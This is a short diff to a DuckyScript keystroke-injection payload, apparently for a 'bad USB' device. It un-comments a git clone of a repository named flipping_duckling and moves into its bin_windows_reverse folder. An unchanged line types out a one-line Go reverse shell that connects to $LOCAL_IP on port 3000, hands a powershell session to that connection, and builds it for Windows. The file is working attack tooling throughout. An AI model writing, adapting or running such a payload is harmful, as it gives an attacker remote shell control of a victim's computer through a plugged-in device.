@@ -12,7 +12,8 @@ STRINGLN mkdir -p /tmp/ducky/
 STRINGLN cd /tmp/ducky/
 
 REM build
-REM STRINGLN git clone https://github.com/CodedMasonry/flipping_duckling.git
+STRINGLN git clone https://github.com/CodedMasonry/flipping_duckling.git
+STRINGLN cd flipping_duckling/bin_windows_reverse/
 
 STRINGLN echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$LOCAL_IP:3000");cmd:=exec.Command("powershell");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && GOOS=windows go build /tmp/t.go && rm /tmp/t.go
 DELAY 1000
